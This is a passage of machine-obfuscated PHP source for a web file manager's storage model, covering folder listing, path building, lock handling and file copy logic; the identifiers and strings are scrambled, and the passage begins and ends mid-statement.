$bÏ…ñÄÍÊÆ[$B©‡ÂùÜ¼[397]] == $B©‡ÂùÜ¼[86]; if ($b÷§ä†¢©¨) { $bœ“ğÚßÃò[$bÏ…ñÄÍÊÆ[$B©‡ÂùÜ¼[390]]] = $bÏ…ñÄÍÊÆ[$B©‡ÂùÜ¼[28]]; } if (isset($Dğ’‚÷ÈÉå[$bÏ…ñÄÍÊÆ[$B©‡ÂùÜ¼[481]]])) { continue; } $Dğ’‚÷ÈÉå[$bÏ…ñÄÍÊÆ[$B©‡ÂùÜ¼[481]]] = !0; $c¼”ÁËÃÈ = $this->parentLevelArray($bÏ…ñÄÍÊÆ[$B©‡ÂùÜ¼[481]]); foreach ($c¼”ÁËÃÈ as $EÛˆøÜÊ¦ => $f•Ú¶É•³) { if ($EÛˆøÜÊ¦ != 0 && !isset($bœ“ğÚßÃò[$f•Ú¶É•³])) { $Eµê½Ç°Î£[] = $f•Ú¶É•³; } } } unset($bÏ…ñÄÍÊÆ); goto få›å÷ä±; A•ËŸîÜŒ»: unset($bÏ…ñÄÍÊÆ); return $c½šÏŒÒÇ; goto BŒšù«ç·„; få›å÷ä±: $Eµê½Ç°Î£ = array_unique($Eµê½Ç°Î£); if (count($Eµê½Ç°Î£) > 0) { $fÛù¸•ß = array($B©‡ÂùÜ¼[404] => array($B©‡ÂùÜ¼[405], $Eµê½Ç°Î£)); if (count($Eµê½Ç°Î£) == 1) { $FÄ´Œ´ƒÀ = $this->sourceInfo($Eµê½Ç°Î£[0]); $E–ÖÏÒ“’Ä = is_array($FÄ´Œ´ƒÀ) ? array($FÄ´Œ´ƒÀ) : !1; } else { $E–ÖÏÒ“’Ä = $this->field($B©‡ÂùÜ¼[487])->where($fÛù¸•ß)->select(); } if (!$E–ÖÏÒ“’Ä) { $E–ÖÏÒ“’Ä = array(); } foreach ($E–ÖÏÒ“’Ä as $e™Ñíçô”) { $bœ“ğÚßÃò[$e™Ñíçô”[$B©‡ÂùÜ¼[390]]] = $e™Ñíçô”[$B©‡ÂùÜ¼[28]]; } } $F†ñ¶É…â® = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto føò§‡Å‹´; BŒšù«ç·„: } private function _listAppendPathRecycle(&$báƒÜ¹ö«, $E³¶œ„ë», $EÕ”‘µ…ù¯) { goto fÜ¿½¤Ó‰; A½†ŸÔñáŠ: if ($báƒÜ¹ö«[$F¦á»µŠâ¢[390]] == $EÕ”‘µ…ù¯) { $báƒÜ¹ö«[$F¦á»µŠâ¢[481]] = $F¦á»µŠâ¢[493]; $báƒÜ¹ö«[$F¦á»µŠâ¢[472]] = $F¦á»µŠâ¢[491]; $báƒÜ¹ö«[$F¦á»µŠâ¢[28]] = LNG($F¦á»µŠâ¢[492]); } $báƒÜ¹ö«[$F¦á»µŠâ¢[494]] = $F¦á»µŠâ¢[495]; goto A¹ò³ö´«; fÜ¿½¤Ó‰: $F¦á»µŠâ¢ =& $_SERVER[ÉóçÄÇ]; if (!in_array($EÕ”‘µ…ù¯, $E³¶œ„ë») && $báƒÜ¹ö«[$F¦á»µŠâ¢[390]] != $EÕ”‘µ…ù¯) { return; } $Bø»»öõ•ƒ = explode($F¦á»µŠâ¢[8], trim($báƒÜ¹ö«[$F¦á»µŠâ¢[489]], $F¦á»µŠâ¢[8])); goto b‰ºËğ‹ÙŒ; b‰ºËğ‹ÙŒ: $Fª£Šöå„” = implode($F¦á»µŠâ¢[8], array_slice($Bø»»öõ•ƒ, 2)); $báƒÜ¹ö«[$F¦á»µŠâ¢[489]] = $F¦á»µŠâ¢[8] . LNG($F¦á»µŠâ¢[492]) . $F¦á»µŠâ¢[8] . ltrim($Fª£Šöå„”, $F¦á»µŠâ¢[8]); $báƒÜ¹ö«[$F¦á»µŠâ¢[481]] = $F¦á»µŠâ¢[493] . implode($F¦á»µŠâ¢[47], array_slice($E³¶œ„ë», 1)) . $F¦á»µŠâ¢[47]; goto A½†ŸÔñáŠ; A¹ò³ö´«: } protected function _listAppendPathRoot(&$cš àÈ¸©’, $Bó¥ê©ÙíÕ) { $C‰œÇƒÓ™ =& $_SERVER[ÉóçÄÇ]; $EÉÀ§Ä›å = $C‰œÇƒÓ™[33]; if ($cš àÈ¸©’[$C‰œÇƒÓ™[398]] == self::TYPE_USER) { if (defined($C‰œÇƒÓ™[448]) && $cš àÈ¸©’[$C‰œÇƒÓ™[478]] == USER_ID) { $EÉÀ§Ä›å = LNG($C‰œÇƒÓ™[496]); if (!$Bó¥ê©ÙíÕ) { $cš àÈ¸©’[$C‰œÇƒÓ™[28]] = $EÉÀ§Ä›å; } } else { $CåµŞÄ£–µ = Model($C‰œÇƒÓ™[497])->getInfoSimple($cš àÈ¸©’[$C‰œÇƒÓ™[478]]); $EÉÀ§Ä›å = LNG($C‰œÇƒÓ™[498]) . $C‰œÇƒÓ™[159] . $CåµŞÄ£–µ[$C‰œÇƒÓ™[28]] . $C‰œÇƒÓ™[499]; } } else { if ($cš àÈ¸©’[$C‰œÇƒÓ™[398]] == self::TYPE_GROUP) { $CåµŞÄ£–µ = Model($C‰œÇƒÓ™[480])->getInfoSimple($cš àÈ¸©’[$C‰œÇƒÓ™[478]]); $EÉÀ§Ä›å = $CåµŞÄ£–µ[$C‰œÇƒÓ™[28]]; } else { if ($cš àÈ¸©’[$C‰œÇƒÓ™[398]] == self::TYPE_SYSTEM) { $EÉÀ§Ä›å = $C‰œÇƒÓ™[500]; } } } $EÉÀ§Ä›å = $EÉÀ§Ä›å ? $C‰œÇƒÓ™[8] . $EÉÀ§Ä›å . $C‰œÇƒÓ™[8] : $C‰œÇƒÓ™[8]; return $EÉÀ§Ä›å; } protected function _listAppendUser(&$bÂƒÀ¯³Ï´) { goto f½²®Ø¢¯µ; fàéŒ šø: unset($B¯Í——†š); goto dÃ†ŒÕ•ºá; D¥æô²Š®Á: $CßŸ¬Š¥‡ = array_merge($a¦«ó‚ë¼½, $AÄâÓĞóÈ); $cˆÏ«ÔÒÄ = Model($Aá¥àÅ¶š‡[501])->userListInfo($CßŸ¬Š¥‡); foreach ($bÂƒÀ¯³Ï´ as &$B¯Í——†š) { $Fø­¯ªïÙ = $B¯Í——†š[$Aá¥àÅ¶š‡[426]]; $B¯Í——†š[$Aá¥àÅ¶š‡[426]] = $cˆÏ«ÔÒÄ[$Fø­¯ªïÙ] ? $cˆÏ«ÔÒÄ[$Fø­¯ªïÙ] : !1; $Fø­¯ªïÙ = $B¯Í——†š[$Aá¥àÅ¶š‡[428]]; $B¯Í——†š[$Aá¥àÅ¶š‡[428]] = $cˆÏ«ÔÒÄ[$Fø­¯ªïÙ] ? $cˆÏ«ÔÒÄ[$Fø­¯ªïÙ] : !1; if (isset($B¯Í——†š[$Aá¥àÅ¶š‡[439]]) && $B¯Í——†š[$Aá¥àÅ¶š‡[439]][$Aá¥àÅ¶š‡[502]]) { $AÜèò‡¦†› = $GLOBALS[$Aá¥àÅ¶š‡[6]][$Aá¥àÅ¶š‡[87]][$Aá¥àÅ¶š‡[503]]; if ($B¯Í——†š[$Aá¥àÅ¶š‡[439]][$Aá¥àÅ¶š‡[504]] <= time() - $AÜèò‡¦†›) { $this->metaSet($B¯Í——†š[$Aá¥àÅ¶š‡[390]], $Aá¥àÅ¶š‡[502], null); $this->metaSet($B¯Í——†š[$Aá¥àÅ¶š‡[390]], $Aá¥àÅ¶š‡[504], null); unset($B¯Í——†š[$Aá¥àÅ¶š‡[439]][$Aá¥àÅ¶š‡[502]]); continue; } $AçÉª‡Î²÷ = $B¯Í——†š[$Aá¥àÅ¶š‡[439]][$Aá¥àÅ¶š‡[502]]; $B¯Í——†š[$Aá¥àÅ¶š‡[439]][$Aá¥àÅ¶š‡[505]] = Model($Aá¥àÅ¶š‡[501])->getInfoSimpleOuter($AçÉª‡Î²÷); } } goto fàéŒ šø; f½²®Ø¢¯µ: $Aá¥àÅ¶š‡ =& $_SERVER[ÉóçÄÇ]; $a¦«ó‚ë¼½ = array_to_keyvalue($bÂƒÀ¯³Ï´, $Aá¥àÅ¶š‡[33], $Aá¥àÅ¶š‡[426]); $AÄâÓĞóÈ = array_to_keyvalue($bÂƒÀ¯³Ï´, $Aá¥àÅ¶š‡[33], $Aá¥àÅ¶š‡[428]); goto D¥æô²Š®Á; dÃ†ŒÕ•ºá: } public function parentLevelArray($b÷â”¸†) { $AÓ¡•‘©¡¯ =& $_SERVER[ÉóçÄÇ]; $b÷â”¸† = explode($AÓ¡•‘©¡¯[47], trim($b÷â”¸†, $AÓ¡•‘©¡¯[47])); return array_remove_value($b÷â”¸†, $AÓ¡•‘©¡¯[491]); } public function listAll($e‰Ê°ìãĞ¿) { goto dÌ±ò‘Ü±Ğ; dÌ±ò‘Ü±Ğ: $dœÃÍ·İ¸ê =& $_SERVER[ÉóçÄÇ]; $Bâ°âÛ¨ã = $this->sourceInfo($e‰Ê°ìãĞ¿); $aÆÊŸÔ²æÙ = array($dœÃÍ·İ¸ê[506] => array($dœÃÍ·İ¸ê[507], $Bâ°âÛ¨ã[$dœÃÍ·İ¸ê[481]] . $e‰Ê°ìãĞ¿ . $dœÃÍ·İ¸ê[508]), $dœÃÍ·İ¸ê[509] => 0); goto A‡Ñ©»Ë‰; A‡Ñ©»Ë‰: $CšêáÕéøÆ = $dœÃÍ·İ¸ê[510]; $C¨¨¹•¼Ö… = "\x4c\105\x46\x54\40\112\117\111\116\x20{$this->tablePrefix}\x69\x6f\x5f\x66\x69\154\145\x20\146\151\154\145\x20\x6f\156\40\163\157\x75\x72\x63\x65\56\x66\x69\x6c\145\x49\x44\40\x3d\x20\146\x69\x6c\145\56\x66\x69\x6c\x65\x49\x44"; $aÊÑÇæ‘†è = $this->alias($dœÃÍ·İ¸ê[511])->field($CšêáÕéøÆ)->where($aÆÊŸÔ²æÙ)->join($C¨¨¹•¼Ö…)->select(); goto f›Ñ½×¢ê´; A‹â¹Óù­: $Cğã¯ˆê‹ß = array(); foreach ($aÊÑÇæ‘†è as $fºšô¸ë => $b ®´—µ) { goto D¤¼ ¬‚ˆÎ; D¤¼ ¬‚ˆÎ: $E‡Ø™Š¨œ¸ = $this->parentLevelArray($b ®´—µ[$dœÃÍ·İ¸ê[481]]); array_shift($E‡Ø™Š¨œ¸); $aÍ„­çáÌÚ = $a¨Ù×‡±ù; goto a·šÜí´˜‰; e–Ã°‹Ÿöõ: if (!$b ®´—µ[$dœÃÍ·İ¸ê[397]]) { $C İñğâ¾ƒ[$dœÃÍ·İ¸ê[441]] = $b ®´—µ[$dœÃÍ·İ¸ê[441]]; $C İñğâ¾ƒ[$dœÃÍ·İ¸ê[85]] = $b ®´—µ[$dœÃÍ·İ¸ê[75]]; } $Cğã¯ˆê‹ß[] = $C İñğâ¾ƒ; goto eóÓªÇ¸›; a·šÜí´˜‰: for ($fÍ·Ò¦±ç = 0; $fÍ·Ò¦±ç < count($E‡Ø™Š¨œ¸); $fÍ·Ò¦±ç++) { $aÍ„­çáÌÚ .= $aÊÑÇæ‘†è[$E‡Ø™Š¨œ¸[$fÍ·Ò¦±ç]][$dœÃÍ·İ¸ê[28]] . $dœÃÍ·İ¸ê[8]; } $aÍ„­çáÌÚ .= $b ®´—µ[$dœÃÍ·İ¸ê[28]]; if ($b ®´—µ[$dœÃÍ·İ¸ê[397]]) { $aÍ„­çáÌÚ .= $dœÃÍ·İ¸ê[8]; } goto f¶´¾‚ñ³‹; f¶´¾‚ñ³‹: $aÍ„­çáÌÚ = str_replace($dœÃÍ·İ¸ê[490], $dœÃÍ·İ¸ê[8], $aÍ„­çáÌÚ); $aÍ„­çáÌÚ = str_replace($dœÃÍ·İ¸ê[490], $dœÃÍ·İ¸ê[8], $aÍ„­çáÌÚ); $C İñğâ¾ƒ = array($dœÃÍ·İ¸ê[408] => str_replace($dœÃÍ·İ¸ê[490], $dœÃÍ·İ¸ê[8], $aÍ„­çáÌÚ), $dœÃÍ·İ¸ê[512] => intval($b ®´—µ[$dœÃÍ·İ¸ê[397]]), $dœÃÍ·İ¸ê[84] => $this->pathInfoFilter($b ®´—µ)); goto e–Ã°‹Ÿöõ; eóÓªÇ¸›: } return $Cğã¯ˆê‹ß; goto DæŒç…£„…; f›Ñ½×¢ê´: $this->_listAppendAuth($aÊÑÇæ‘†è); $this->_listAppendUser($aÊÑÇæ‘†è); $this->_listAppendPath($aÊÑÇæ‘†è); goto B²…´¨Ú ©; B²…´¨Ú ©: $aÊÑÇæ‘†è = array_to_keyvalue($aÊÑÇæ‘†è, $dœÃÍ·İ¸ê[390]); $a¨Ù×‡±ù = "\x2f{$Bâ°âÛ¨ã[$dœÃÍ·İ¸ê[28]]}\x2f"; $a¨Ù×‡±ù = $a¨Ù×‡±ù == $dœÃÍ·İ¸ê[490] ? $dœÃÍ·İ¸ê[8] : $a¨Ù×‡±ù; goto A‹â¹Óù­; DæŒç…£„…: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($c×››³á) { goto b¤Á Ä“²£; b¤Á Ä“²£: $A‰èîêóê“ =& $_SERVER[ÉóçÄÇ]; if (!$this->allowLock()) { return; } $this->_lockCheck($A‰èîêóê“[513], $c×››³á); goto c­ˆª†³¿; c­ˆª†³¿: $aÚ—øÂ„» = 1; $this->_lockEvent($c×››³á, array($A‰èîêóê“[514], $A‰èîêóê“[515]), $aÚ—øÂ„»); $this->_lockParent($c×››³á, array($A‰èîêóê“[515]), $aÚ—øÂ„»); goto cñÒßóŠ×Œ; cñÒßóŠ×Œ: $this->_lockEvent($c×››³á, array($A‰èîêóê“[516], $A‰èîêóê“[517]), $aÚ—øÂ„»); $this->_lockCheckEnd($A‰èîêóê“[513], $c×››³á); goto c›ˆŸ¦³ƒ; c›ˆŸ¦³ƒ: } public function lockCopyEnd($dßâÊŸù‘‡) { $C••µƒ¾ =& $_SERVER[ÉóçÄÇ]; if (!$this->allowLock()) { return; } $Dë²×ÎãšÁ = 0; $this->_lockEvent($dßâÊŸù‘‡, array($C••µƒ¾[514], $C••µƒ¾[515]), $Dë²×ÎãšÁ); $this->_lockParent($dßâÊŸù‘‡, array($C••µƒ¾[515]), $Dë²×ÎãšÁ); $this->_lockEvent($dßâÊŸù‘‡, array($C••µƒ¾[516], $C••µƒ¾[517]), $Dë²×ÎãšÁ); } public function lockWriteStart($D§á³ä¥Èâ, $DìÇ¢ÃÍå† = '') { goto cëº”ì‡µµ; cëº”ì‡µµ: $F¯Ñœ¥‹ =& $_SERVER[ÉóçÄÇ]; if (!$this->allowLock()) { return; } $this->_lockCheck($F¯Ñœ¥‹[514], $D§á³ä¥Èâ); goto f»„óá£Ä; fóÑ¯—ÏÊ: $this->_lockParent($D§á³ä¥Èâ, array($F¯Ñœ¥‹[513], $F¯Ñœ¥‹[515]), $A¶­¾„»äé); $this->_lockCheckEnd($F¯Ñœ¥‹[514], $D§á³ä¥Èâ); goto A´—¬½à©›; f»„óá£Ä: $A¶­¾„»äé = 1; $this->_lockKey($F¯Ñœ¥‹[518] . $D§á³ä¥Èâ . $F¯Ñœ¥‹[94] . $DìÇ¢ÃÍå†, $A¶­¾„»äé); $this->_lockEvent($D§á³ä¥Èâ, array($F¯Ñœ¥‹[513], $F¯Ñœ¥‹[515]), $A¶­¾„»äé); goto fóÑ¯—ÏÊ; A´—¬½à©›: } public function lockWriteEnd($bÅí†¦Óæˆ, $CˆÄìøÎ×ğ = '') { $A•Äˆ³Ûø =& $_SERVER[ÉóçÄÇ]; if (!$this->allowLock()) { return; } $e°æø…òÙ„ = 0; $this->_lockKey($A•Äˆ³Ûø[518] . $bÅí†¦Óæˆ . $A•Äˆ³Ûø[94] . $CˆÄìøÎ×ğ, $e°æø…òÙ„); $this->_lockEvent($bÅí†¦Óæˆ, array($A•Äˆ³Ûø[513], $A•Äˆ³Ûø[515]), $e°æø…òÙ„); $this->_lockParent($bÅí†¦Óæˆ, array($A•Äˆ³Ûø[513], $A•Äˆ³Ûø[515]), $e°æø…òÙ„); } public function lockMoveStart($b›†·ÒŸ÷œ) { goto aë†…ê·ã’; BåŸ£áñÅ: $FÇÓ×ë©ÕÖ = 1; $this->_lockKey($Dï¨“ˆ·³è[519] . $b›†·ÒŸ÷œ, $FÇÓ×ë©ÕÖ); $this->_lockEvent($b›†·ÒŸ÷œ, array($Dï¨“ˆ·³è[513], $Dï¨“ˆ·³è[514]), $FÇÓ×ë©ÕÖ); goto B±Á²©æ¸; B±Á²©æ¸: $this->_lockParent($b›†·ÒŸ÷œ, array($Dï¨“ˆ·³è[513], $Dï¨“ˆ·³è[515]), $FÇÓ×ë©ÕÖ); $this->_lockEvent($b›†·ÒŸ÷œ, array($Dï¨“ˆ·³è[520], $Dï¨“ˆ·³è[516], $Dï¨“ˆ·³è[517]), $FÇÓ×ë©ÕÖ); $this->_lockCheckEnd($Dï¨“ˆ·³è[515], $b›†·ÒŸ÷œ); goto a¦ğ„Ãá¦; aë†…ê·ã’: $Dï¨“ˆ·³è =& $_SERVER[ÉóçÄÇ]; if (!$this->allowLock()) { return; } $this->_lockCheck($Dï¨“ˆ·³è[515], $b›†·ÒŸ÷œ); goto BåŸ£áñÅ; a¦ğ„Ãá¦: } public function lockMoveEnd($d¯¹³Èê‘™) { goto DÙ‰¾´é‡…; BÒ‚à†½åç: $this->_lockEvent($d¯¹³Èê‘™, array($Fóµ½·÷½[520], $Fóµ½·÷½[516], $Fóµ½·÷½[517]), $dÆÈí”¢); goto D­¸†ŞÄ×±; eà¡ÔÈ¦Î: $this->_lockKey($Fóµ½·÷½[519] . $d¯¹³Èê‘™, $dÆÈí”¢); $this->_lockEvent($d¯¹³Èê‘™, array($Fóµ½·÷½[513], $Fóµ½·÷½[514]), $dÆÈí”¢); $this->_lockParent($d¯¹³Èê‘™, array($Fóµ½·÷½[513], $Fóµ½·÷½[515]), $dÆÈí”¢); goto BÒ‚à†½åç; DÙ‰¾´é‡…: $Fóµ½·÷½ =& $_SERVER[ÉóçÄÇ]; if (!$this->allowLock()) { return; } $dÆÈí”¢ = 0; goto eà¡ÔÈ¦Î; D­¸†ŞÄ×±: } private function _lockCheck($f…âÀ ÃŞ, $Cš·™í¦ÙÎ) { goto D¹ŠÚ¯äÛù; BàÈğµò’: $this->_lockTimeStart[$c»È ´™‚] = timeFloat(); if (!is_array($AÔ§ò»Šµˆ)) { return; } $b¹ØÅŒ¯é = LNG($F¶‘ƒµ—ñ[521]); goto B„Úƒã£¡; d¦çÆîôà–: $cŒÛé›…êÎ = array_reverse($this->parentLevelArray($AÔ§ò»Šµˆ[$F¶‘ƒµ—ñ[481]])); foreach ($cŒÛé›…êÎ as $cÒÎˆÊ³¾‰) { $c»È ´™‚ = $f…âÀ ÃŞ . $F¶‘ƒµ—ñ[522] . $cÒÎˆÊ³¾‰; if (CacheLock::lockGet($F¶‘ƒµ—ñ[523] . $c»È ´™‚)) { $AÔ§ò»Šµˆ = $this->sourceInfo($cÒÎˆÊ³¾‰); CacheLock::setErrorMsg($F¶‘ƒµ—ñ[159] . htmlspecialchars($AÔ§ò»Šµˆ[$F¶‘ƒµ—ñ[28]]) . $F¶‘ƒµ—ñ[499] . $b¹ØÅŒ¯é); $this->_lockKey($c»È ´™‚, 1); $this->_lockKey($c»È ´™‚, 0); } } goto E‰ßˆë‰‡ù; D¹ŠÚ¯äÛù: $F¶‘ƒµ—ñ =& $_SERVER[ÉóçÄÇ]; $AÔ§ò»Šµˆ = $this->sourceInfo($Cš·™í¦ÙÎ); $c»È ´™‚ = $f…âÀ ÃŞ . $F¶‘ƒµ—ñ[94] . $Cš·™í¦ÙÎ; goto BàÈğµò’; B„Úƒã£¡: CacheLock::setErrorMsg($F¶‘ƒµ—ñ[159] . htmlspecialchars($AÔ§ò»Šµˆ[$F¶‘ƒµ—ñ[28]]) . $F¶‘ƒµ—ñ[499] . $b¹ØÅŒ¯é); $this->_lockKey($c»È ´™‚, 1); $this->_lockKey($c»È ´™‚, 0); goto d¦çÆîôà–; E‰ßˆë‰‡ù: } private function _lockCheckEnd($CĞ—çùÅŒ, $F¢İ“œİì ) { goto c¾˜¬Ñˆ»ƒ; c¾˜¬Ñˆ»ƒ: $dˆë°À¸ÁÆ =& $_SERVER[ÉóçÄÇ]; $B¾ÃÄÈĞÌŠ = $CĞ—çùÅŒ . $dˆë°À¸ÁÆ[94] . $F¢İ“œİì ; CacheLock::setErrorMsg($dˆë°À¸ÁÆ[373]); goto A²»Œ·Ê—; A²»Œ·Ê—: if (!isset($this->_lockTimeStart[$B¾ÃÄÈĞÌŠ])) { return; } $B…¤ªòº» = timeFloat() - $this->_lockTimeStart[$B¾ÃÄÈĞÌŠ]; unset($this->_lockTimeStart[$B¾ÃÄÈĞÌŠ]); goto aÛ•ÔŠµ¬; aÛ•ÔŠµ¬: if ($B…¤ªòº» > 0.5) { unset(self::$cacheSourceInfo[$dˆë°À¸ÁÆ[432] . $F¢İ“œİì ]); } $bÁÎ¸êÛğ† = $this->sourceInfo($F¢İ“œİì ); if (!$bÁÎ¸êÛğ†) { show_json(LNG($dˆë°À¸ÁÆ[104]), !1); } goto dæñêö‰å; dæñêö‰å: } private function _lockParent($B§²Ê·‚, $a“‰œŒŞ, $e“·­½Ç¿) { if (!$this->autoLockSet) { return; } $bâ’ğ¼‘ó· = $this->sourceInfo($B§²Ê·‚); if (!is_array($bâ’ğ¼‘ó·)) { return; } $Aº°©ŠÌ·° = array_reverse($this->parentLevelArray($bâ’ğ¼‘ó·[$_SERVER[ÉóçÄÇ][481]])); foreach ($Aº°©ŠÌ·° as $C†±à¬„ñ) { $this->_lockEvent($C†±à¬„ñ, $a“‰œŒŞ, $e“·­½Ç¿); } } private function _lockEvent($EİçÖ˜Ù¾, $b‘¹©È‡‚, $FÌ´æ¸õ¬…) { $DÒÁ‡óÍªĞ =& $_SERVER[ÉóçÄÇ]; if (!$this->autoLockSet) { return; } foreach ($b‘¹©È‡‚ as $a‚‹ÍÊ¬î) { $eíÌ£—äÉ = $a‚‹ÍÊ¬î . $DÒÁ‡óÍªĞ[94] . $EİçÖ˜Ù¾; if ($FÌ´æ¸õ¬… && CacheLock::lockGet($DÒÁ‡óÍªĞ[523] . $eíÌ£—äÉ)) { continue; } $this->_lockKey($eíÌ£—äÉ, $FÌ´æ¸õ¬…); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($aò¸˜ÙßÈ, $B…«ÎŞİÚ = 1) { $CÖºãôå‹ = $_SERVER[ÉóçÄÇ][523] . md5($aò¸˜ÙßÈ); if ($B…«ÎŞİÚ) { if (isset(self::$_lockItemArr[$CÖºãôå‹])) { return; } self::$_lockItemArr[$CÖºãôå‹] = 1; CacheLock::lock($CÖºãôå‹, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$CÖºãôå‹])) { return; } unset(self::$_lockItemArr[$CÖºãôå‹]); CacheLock::unlock($CÖºãôå‹); } } public function isParentOf($Cì’ª†à¢÷, $F±†á«½îİ) { goto cš®ù¸Ü´; cš®ù¸Ü´: $båÃóãĞ§ê =& $_SERVER[ÉóçÄÇ]; $E—¨‹è†öÌ = $this->sourceInfo($Cì’ª†à¢÷); $eÃó©Ÿî¡î = $this->sourceInfo($F±†á«½îİ); goto aãÁÑ±Ó¼«; dªæº·ø„: return $AŠÈÁÂÖ…; goto d½‘Ë²É¬œ; aãÁÑ±Ó¼«: $Aîñ²Èğ¨× = $E—¨‹è†öÌ[$båÃóãĞ§ê[481]] . $E—¨‹è†öÌ[$båÃóãĞ§ê[390]] . $båÃóãĞ§ê[47]; $eÎğ£‡äªŠ = $eÃó©Ÿî¡î[$båÃóãĞ§ê[481]] . $eÃó©Ÿî¡î[$båÃóãĞ§ê[390]] . $båÃóãĞ§ê[47]; $AŠÈÁÂÖ… = strpos($eÎğ£‡äªŠ, $Aîñ²Èğ¨×) === 0; goto dªæº·ø„; d½‘Ë²É¬œ: } private $targetIsDelete = 0; public function copy($CÂğÚ”³ô¦, $fêÕ­Ñ–“‰, $A‚®¢‚Œ¿¡ = REPEAT_REPLACE, $eóõ”µöİƒ = '') { goto EÔì÷ìğƒÄ; aƒ šê•í: $this->_childrenListClear(); $this->lockCopyEnd($CÂğÚ”³ô¦); $this->lockWriteEnd($fêÕ­Ñ–“‰, $DÖŠìË¼); goto aé¦Ÿ¥¸Å­; aé¦Ÿ¥¸Å­: if ($B½õÆ÷ë‚½[$bÏ¸’–¼³œ[397]] == $bÏ¸’–¼³œ[86] && $E¬ ê‡õ·© == $bÓ‚òºÜïÅ) { $this->folderSizeResetChildren($E¬ ê‡õ·©); } Model($bÏ¸’–¼³œ[527])->addAll($D¬Ïõİ”©[$bÏ¸’–¼³œ[525]], array(), !0); if ($E¬ ê‡õ·© != $bÓ‚òºÜïÅ || $B½õÆ÷ë‚½[$bÏ¸’–¼³œ[397]] == $bÏ¸’–¼³œ[86]) { Model($bÏ¸’–¼³œ[528])->eventCopy($bÓ‚òºÜïÅ); } goto bŒËÛ¯Õ¢; B¦Ğ¶„¸ ä: if (!$B½õÆ÷ë‚½ || !$C¾ÑÖÎ”… || $C¾ÑÖÎ”…[$bÏ¸’–¼³œ[397]] != $bÏ¸’–¼³œ[86]) { return !1; } if ($this->isParentOf($CÂğÚ”³ô¦, $fêÕ­Ñ–“‰)) { return !1; } $DÖŠìË¼ = $eóõ”µöİƒ ? $eóõ”µöİƒ : $B½õÆ÷ë‚½[$bÏ¸’–¼³œ[28]]; goto F·ÛÜÑ½„·; bŒËÛ¯Õ¢: $this->saveAll($D¬Ïõİ”©[$bÏ¸’–¼³œ[526]]); Model($bÏ¸’–¼³œ[173])->linkAdd($D¬Ïõİ”©[$bÏ¸’–¼³œ[524]]); $this->folderSizeReset($fêÕ­Ñ–“‰); goto B„Œ×øÓå; EÔì÷ìğƒÄ: $bÏ¸’–¼³œ =& $_SERVER[ÉóçÄÇ]; $B½õÆ÷ë‚½ = $this->sourceInfo($CÂğÚ”³ô¦); $C¾ÑÖÎ”… = $this->sourceInfo($fêÕ­Ñ–“‰); goto B¦Ğ¶„¸ ä; F·ÛÜÑ½„·: $this->lockCopyStart($CÂğÚ”³ô¦); $this->lockWriteStart($fêÕ­Ñ–“‰, $DÖŠìË¼); $D¬Ïõİ”© = array($bÏ¸’–¼³œ[524] => array(), $bÏ¸’–¼³œ[525] => array(), $bÏ¸’–¼³œ[526] => array()); goto dí·Ãœ¿•Ì; B„Œ×øÓå: $this->updateModifyTime($fêÕ­Ñ–“‰); return $bÓ‚òºÜïÅ; goto d¬š£”ËÏ¨; dí·Ãœ¿•Ì: $this->targetIsDelete = intval($B½õÆ÷ë‚½[$bÏ¸’–¼³œ[417]]); $E¬ ê‡õ·© = $this->fileNameExistCache($fêÕ­Ñ–“‰, $B½õÆ÷ë‚½[$bÏ¸’–¼³œ[28]]); $bÓ‚òºÜïÅ = $this->_copy($CÂğÚ”³ô¦, $fêÕ­Ñ–“‰, $A‚®¢‚Œ¿¡, $D¬Ïõİ”©, !0, $eóõ”µöİƒ); goto aƒ šê•í; d¬š£”ËÏ¨: } private function _copy($e“›ÃóƒÊÛ, $f– òï°Ú, $f›³±®°İ¯, &$C£ğÕ…¦µô, $cÔ©‘§¬×, $Aé›î‰’Íí = '') { goto e¥êñâ ×í; eÀÆßˆ½¼³: return $dÔÎ¹‚ÀÒ‡; goto f’ÊÇ¾¼ë; fï£óã‰Í…: $B““†ÔœÆÔ = $Aé›î‰’Íí ? $Aé›î‰’Íí : $aâ¿«™·—[$Dæ‚«˜‡øˆ[28]]; $eŒ±×ÚËî = $this->fileNameExistCache($f– òï°Ú, $B““†ÔœÆÔ); if ($cÔ©‘§¬×) { $this->_childrenAllMake($e“›ÃóƒÊÛ); if ($BìÆù¥ˆ¬ && $eŒ±×ÚËî) { $this->_childrenAllMake($eŒ±×ÚËî); } } goto f»•„‘˜Î®; e¥êñâ ×í: $Dæ‚«˜‡øˆ =& $_SERVER[ÉóçÄÇ]; $aâ¿«™·— = $this->sourceInfoCache($e“›ÃóƒÊÛ); $BìÆù¥ˆ¬ = $aâ¿«™·—[$Dæ‚«˜‡øˆ[397]] == $Dæ‚«˜‡øˆ[86]; goto fï£óã‰Í…; f»•„‘˜Î®: if (!$eŒ±×ÚËî) { return $this->_copyCreate($e“›ÃóƒÊÛ, $f– òï°Ú, $B““†ÔœÆÔ, $C£ğÕ…¦µô); } $dÔÎ¹‚ÀÒ‡ = $eŒ±×ÚËî; if ($BìÆù¥ˆ¬) { if ($f›³±®°İ¯ == REPEAT_RENAME_FOLDER) { $B““†ÔœÆÔ = $this->fileNameAutoCache($f– òï°Ú, $B““†ÔœÆÔ, $f›³±®°İ¯, $BìÆù¥ˆ¬); $dÔÎ¹‚ÀÒ‡ = $this->_copyCreate($e“›ÃóƒÊÛ, $f– òï°Ú, $B““†ÔœÆÔ, $C£ğÕ…¦µô); } else { $cÎ´“»•íç = $this->_childrenList($e“›ÃóƒÊÛ); foreach ($cÎ´“»•íç as $a™—³éÒÇ) { $this->_copy($a™—³éÒÇ[$Dæ‚«˜‡øˆ[390]], $eŒ±×ÚËî, $f›³±®°İ¯, $C£ğÕ…¦µô, !1); } } } else { if ($f›³±®°İ¯ == REPEAT_RENAME || $f›³±®°İ¯ == REPEAT_RENAME_FOLDER) { $B““†ÔœÆÔ = $this->fileNameAutoCache($f– òï°Ú, $B““†ÔœÆÔ, $f›³±®°İ¯, $BìÆù¥ˆ¬); $dÔÎ¹‚ÀÒ‡ = $this->_copyCreate($e“›ÃóƒÊÛ, $f– òï°Ú, $B““†ÔœÆÔ, $C£ğÕ…¦µô); } else { if ($f›³±®°İ¯ == REPEAT_REPLACE) { $Fíæîñ‚Ø = 